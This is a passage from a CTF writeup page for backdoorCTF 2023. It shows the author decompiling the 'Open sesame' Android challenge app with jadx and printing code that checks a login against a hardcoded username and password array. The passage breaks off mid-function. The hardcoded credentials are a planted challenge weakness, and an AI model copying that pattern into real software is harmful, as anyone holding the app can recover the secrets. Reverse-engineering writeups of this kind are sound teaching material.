<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="I share my ctf writeups here from time to time."><meta name=author content="Md Abdullahil Kafi"><link rel=canonical href=https://gr007.tech/writeups/2023/backdoor/index.html><link rel=prev href=../../../tags.html><link rel=next href=../bcactf/index.html><link rel=alternate type=application/rss+xml title="RSS feed" href=../../../feed_rss_created.xml><link rel=alternate type=application/rss+xml title="RSS feed of updated content" href=../../../feed_rss_updated.xml><link rel=icon href=../../../assets/favicon.png><meta name=generator content="mkdocs-1.5.3, mkdocs-material-9.5.3"><title>backdoorCTF 2023 - gr007</title><link rel=stylesheet href=../../../assets/stylesheets/main.50c56a3b.min.css><link rel=stylesheet href=../../../assets/stylesheets/palette.06af60db.min.css><style>.md-tag--pwn{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14 12h-4v-2h4m0 6h-4v-2h4m6-6h-2.81a5.985 5.985 0 0 0-1.82-1.96L17 4.41 15.59 3l-2.17 2.17a6.002 6.002 0 0 0-2.83 0L8.41 3 7 4.41l1.62 1.63C7.88 6.55 7.26 7.22 6.81 8H4v2h2.09c-.05.33-.09.66-.09 1v1H4v2h2v1c0 .34.04.67.09 1H4v2h2.81c1.04 1.79 2.97 3 5.19 3s4.15-1.21 5.19-3H20v-2h-2.09c.05-.33.09-.66.09-1v-1h2v-2h-2v-1c0-.34-.04-.67-.09-1H20V8Z"/></svg>');}</style><script src=https://unpkg.com/iframe-worker/shim></script><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Fira+Code:300,300i,400,400i,700,700i%7CFira+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Fira Code";--md-code-font:"Fira Mono"}</style><link rel=stylesheet href=../../../css/timeago.css><link rel=stylesheet href=../../../stylesheets/extra.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.css><script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><meta property=og:type content=website><meta property=og:title content="backdoorCTF 2023 - gr007"><meta property=og:description content="I share my ctf writeups here from time to time."><meta property=og:image content=https://gr007.tech/assets/images/social/writeups/2023/backdoor/index.png><meta property=og:image:type content=image/png><meta property=og:image:width content=1200><meta property=og:image:height content=630><meta property=og:url content=https://gr007.tech/writeups/2023/backdoor/index.html><meta name=twitter:card content=summary_large_image><meta name=twitter:title content="backdoorCTF 2023 - gr007"><meta name=twitter:description content="I share my ctf writeups here from time to time."><meta name=twitter:image content=https://gr007.tech/assets/images/social/writeups/2023/backdoor/index.png><meta name=google-site-verification content=lC3ni7H9emDGLDFjOH09TTnpE_dF4KFsKWBgvINpsnc> <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
        html.glightbox-open { overflow: initial; height: 100%; }
        .gslide-title { margin-top: 0px; user-select: text; }
        .gslide-desc { color: #666; user-select: text; }
        .gslide-image img { background: white; }
        
            .gscrollbar-fixer { padding-right: 15px; }
            .gdesc-inner { font-size: 0.75rem; }
            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}
            </style> <script src="../../../assets/javascripts/glightbox.min.js"></script></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=teal> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#backdoorctf-2023 class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../../index.html title=gr007 class="md-header__button md-logo" aria-label=gr007 data-md-component=logo> <img src=../../../assets/logo.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> gr007 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> backdoorCTF 2023 </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=teal aria-label="Switch to light mode" type=radio name=__palette id=__palette_0> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme=default data-md-color-primary=black data-md-color-accent=teal aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_0 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg> </label> </form> <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" title=Share aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" title=Clear aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/gr007-40/gr007-40.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> gr007-40.github.io </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class=md-grid> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../../index.html class=md-tabs__link> About me </a> </li> <li class=md-tabs__item> <a href=../../../tags.html class=md-tabs__link> Tags </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href=index.html class=md-tabs__link> Writeups </a> </li> <li class=md-tabs__item> <a href=../../../blog/index.html class=md-tabs__link> Blogs </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../../index.html title=gr007 class="md-nav__button md-logo" aria-label=gr007 data-md-component=logo> <img src=../../../assets/logo.png alt=logo> </a> gr007 </label> <div class=md-nav__source> <a href=https://github.com/gr007-40/gr007-40.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> gr007-40.github.io </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../index.html class=md-nav__link> <span class=md-ellipsis> About me </span> </a> </li> <li class=md-nav__item> <a href=../../../tags.html class=md-nav__link> <span class=md-ellipsis> Tags </span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3 checked> <label class=md-nav__link for=__nav_3 id=__nav_3_label tabindex> <span class=md-ellipsis> Writeups </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_3_label aria-expanded=true> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Writeups </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3_1 checked> <label class=md-nav__link for=__nav_3_1 id=__nav_3_1_label tabindex> <span class=md-ellipsis> 2023 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_3_1_label aria-expanded=true> <label class=md-nav__title for=__nav_3_1> <span class="md-nav__icon md-icon"></span> 2023 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3_1_1 checked> <div class="md-nav__link md-nav__container"> <a href=index.html class="md-nav__link md-nav__link--active"> <span class=md-ellipsis> Backdoor </span> </a> </div> <nav class=md-nav data-md-level=3 aria-labelledby=__nav_3_1_1_label aria-expanded=true> <label class=md-nav__title for=__nav_3_1_1> <span class="md-nav__icon md-icon"></span> Backdoor </label> <ul class=md-nav__list data-md-scrollfix> </ul> </nav> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../bcactf/index.html class=md-nav__link> <span class=md-ellipsis> Bcactf </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../coderush/index.html class=md-nav__link> <span class=md-ellipsis> Coderush </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../deadface/index.html class=md-nav__link> <span class=md-ellipsis> Deadface </span> <span class="md-nav__icon md-icon"></span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2 id=__nav_3_2_label tabindex> <span class=md-ellipsis> 2022 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_3_2_label aria-expanded=false> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 2022 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../2022/flaghunt/index.html class=md-nav__link> <span class=md-ellipsis> Flaghunt </span> <span class="md-nav__icon md-icon"></span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_4> <div class="md-nav__link md-nav__container"> <a href=../../../blog/index.html class="md-nav__link "> <span class=md-ellipsis> Blogs </span> </a> <label class="md-nav__link " for=__nav_4 id=__nav_4_label tabindex> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_4_label aria-expanded=false> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Blogs </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_4_2> <label class=md-nav__link for=__nav_4_2 id=__nav_4_2_label tabindex> <span class=md-ellipsis> Archive </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_4_2_label aria-expanded=false> <label class=md-nav__title for=__nav_4_2> <span class="md-nav__icon md-icon"></span> Archive </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../blog/archive/2023.html class=md-nav__link> <span class=md-ellipsis> 2023 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#open-sesame class=md-nav__link> <span class=md-ellipsis> Open sesame </span> </a> </li> <li class=md-nav__item> <a href=#secret-door class=md-nav__link> <span class=md-ellipsis> Secret door </span> </a> </li> <li class=md-nav__item> <a href=#baby-ebpf class=md-nav__link> <span class=md-ellipsis> Baby-ebpf </span> </a> </li> <li class=md-nav__item> <a href=#sl4ydroid class=md-nav__link> <span class=md-ellipsis> Sl4ydroid </span> </a> </li> <li class=md-nav__item> <a href=#cheat-code class=md-nav__link> <span class=md-ellipsis> Cheat Code </span> </a> </li> <li class=md-nav__item> <a href=#marks class=md-nav__link> <span class=md-ellipsis> Marks </span> </a> </li> <li class=md-nav__item> <a href=#fruit-basket class=md-nav__link> <span class=md-ellipsis> Fruit basket </span> </a> </li> <li class=md-nav__item> <a href=#escape-the-room class=md-nav__link> <span class=md-ellipsis> Escape the Room </span> </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <nav class=md-tags> <a href=../../../tags.html#backdoorctf class="md-tag md-tag-icon">backdoorCTF</a> <a href=../../../tags.html#rev class="md-tag md-tag-icon">rev</a> </nav> <a href=https://github.com/gr007-40/gr007-40.github.io/raw/master/docs/writeups/2023/backdoor/index.md title="View source of this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.15 8.15 0 0 1-1.23-2Z"/></svg> </a> <h1 id=backdoorctf-2023>backdoorCTF 2023<a class=headerlink href=#backdoorctf-2023 title="Permanent link">&para;</a></h1> <h2 id=open-sesame>Open sesame<a class=headerlink href=#open-sesame title="Permanent link">&para;</a></h2> <p>We were given <a href=rev/open_sesame/open_sesame.apk>this</a> app to reverse engineer. This app asks for a user and password as input when installed. We will look into it's source code using <a href=https://github.com/skylot/jadx>jadx</a>. It also comes with a gui. <div class="language-sh highlight"><pre><span></span><code><span id=__span-0-1><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a>backdoor/rev/open_sesame<span class=w> </span>on<span class=w> </span><span class=w> </span>master<span class=w> </span><span class=o>[</span>?<span class=o>]</span>
</span><span id=__span-0-2><a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>❯<span class=w> </span>jadx<span class=w> </span>open_sesame.apk
</span><span id=__span-0-3><a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a>INFO<span class=w>  </span>-<span class=w> </span>loading<span class=w> </span>...
</span><span id=__span-0-4><a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a>INFO<span class=w>  </span>-<span class=w> </span>processing<span class=w> </span>...
</span><span id=__span-0-5><a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a>ERROR<span class=w> </span>-<span class=w> </span>finished<span class=w> </span>with<span class=w> </span>errors,<span class=w> </span>count:<span class=w> </span><span class=m>30</span>
</span></code></pre></div></p> <p>The important part is the following inside the <code>MainActivity.java</code> file: <div class="language-java highlight"><pre><span></span><code><span id=__span-1-1><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=o>[]</span><span class=w> </span><span class=n>valid_password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=mi>52</span><span class=p>,</span><span class=w> </span><span class=n>AppCompatDelegate</span><span class=p>.</span><span class=na>FEATURE_SUPPORT_ACTION_BAR</span><span class=p>,</span><span class=w> </span><span class=mi>49</span><span class=p>,</span><span class=w> </span><span class=mi>98</span><span class=p>,</span><span class=w> </span><span class=mi>97</span><span class=p>,</span><span class=w> </span><span class=mi>98</span><span class=p>,</span><span class=w> </span><span class=mi>97</span><span class=p>};</span>
</span><span id=__span-1-2><a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>valid_user</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&quot;Jack Ma&quot;</span><span class=p>;</span>
</span><span id=__span-1-3><a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=n>Button</span><span class=w> </span><span class=n>buttonLogin</span><span class=p>;</span>
</span><span id=__span-1-4><a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=n>EditText</span><span class=w> </span><span class=n>editTextPassword</span><span class=p>;</span>
</span><span id=__span-1-5><a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=n>EditText</span><span class=w> </span><span class=n>editTextUsername</span><span class=p>;</span>
</span><span id=__span-1-6><a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a>
</span><span id=__span-1-7><a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a><span class=w>    </span><span class=cm>/* JADX INFO: Access modifiers changed from: protected */</span>
</span><span id=__span-1-8><a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a><span class=w>    </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>
</span><span id=__span-1-9><a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onCreate</span><span class=p>(</span><span class=n>Bundle</span><span class=w> </span><span class=n>bundle</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-1-10><a id=__codelineno-1-10 name=__codelineno-1-10 href=#__codelineno-1-10></a><span class=w>        </span><span class=kd>super</span><span class=p>.</span><span class=na>onCreate</span><span class=p>(</span><span class=n>bundle</span><span class=p>);</span>
</span><span id=__span-1-11><a id=__codelineno-1-11 name=__codelineno-1-11 href=#__codelineno-1-11></a><span class=w>        </span><span class=n>setContentView</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>activity_main</span><span class=p>);</span>
</span><span id=__span-1-12><a id=__codelineno-1-12 name=__codelineno-1-12 href=#__codelineno-1-12></a><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>editTextUsername</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>EditText</span><span class=p>)</span><span class=w> </span><span class=n>findViewById</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>editTextUsername</span><span class=p>);</span>
</span><span id=__span-1-13><a id=__codelineno-1-13 name=__codelineno-1-13 href=#__codelineno-1-13></a><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>editTextPassword</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>EditText</span><span class=p>)</span><span class=w> </span><span class=n>findViewById</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>editTextPassword</span><span class=p>);</span>
</span><span id=__span-1-14><a id=__codelineno-1-14 name=__codelineno-1-14 href=#__codelineno-1-14></a><span class=w>        </span><span class=n>Button</span><span class=w> </span><span class=n>button</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Button</span><span class=p>)</span><span class=w> </span><span class=n>findViewById</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>buttonLogin</span><span class=p>);</span>
</span><span id=__span-1-15><a id=__codelineno-1-15 name=__codelineno-1-15 href=#__codelineno-1-15></a><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>buttonLogin</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>button</span><span class=p>;</span>
</span><span id=__span-1-16><a id=__codelineno-1-16 name=__codelineno-1-16 href=#__codelineno-1-16></a><span class=w>        </span><span class=n>button</span><span class=p>.</span><span class=na>setOnClickListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>View</span><span class=p>.</span><span class=na>OnClickListener</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=c1>// from class: com.example.open_sesame.MainActivity.1</span>
</span><span id=__span-1-17><a id=__codelineno-1-17 name=__codelineno-1-17 href=#__codelineno-1-17></a><span class=w>            </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// android.view.View.OnClickListener</span>
</span><span id=__span-1-18><a id=__codelineno-1-18 name=__codelineno-1-18 href=#__codelineno-1-18></a><span class=w>            </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onClick</span><span class=p>(</span><span class=n>View</span><span class=w> </span><span class=n>view</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-1-19><a id=__codelineno-1-19 name=__codelineno-1-19 href=#__codelineno-1-19></a><span class=w>                </span><span class=n>MainActivity</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>validateCredentials</span><span class=p>();</span>
</span><span id=__span-1-20><a id=__codelineno-1-20 name=__codelineno-1-20 href=#__codelineno-1-20></a><span class=w>            </span><span class=p>}</span>
</span><span id=__span-1-21><a id=__codelineno-1-21 name=__codelineno-1-21 href=#__codelineno-1-21></a><span class=w>        </span><span class=p>});</span>
</span><span id=__span-1-22><a id=__codelineno-1-22 name=__codelineno-1-22 href=#__codelineno-1-22></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-1-23><a id=__codelineno-1-23 name=__codelineno-1-23 href=#__codelineno-1-23></a>
</span><span id=__span-1-24><a id=__codelineno-1-24 name=__codelineno-1-24 href=#__codelineno-1-24></a><span class=w>    </span><span class=cm>/* JADX INFO: Access modifiers changed from: private */</span>
</span><span id=__span-1-25><a id=__codelineno-1-25 name=__codelineno-1-25 href=#__codelineno-1-25></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>validateCredentials</span><span class=p>()</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-1-26><a id=__codelineno-1-26 name=__codelineno-1-26 href=#__codelineno-1-26></a><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>trim</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>editTextUsername</span><span class=p>.</span><span class=na>getText</span><span class=p>().</span><span class=na>toString</span><span class=p>().</span><span class=na>trim</span><span class=p>();</span>
</span><span id=__span-1-27><a id=__codelineno-1-27 name=__codelineno-1-27 href=#__codelineno-1-27></a><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>trim2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>editTextPassword</span><span class=p>.</span><span class=na>getText</span><span class=p>().</span><span class=na>toString</span><span class=p>().</span><span class=na>trim</span><span class=p>();</span>
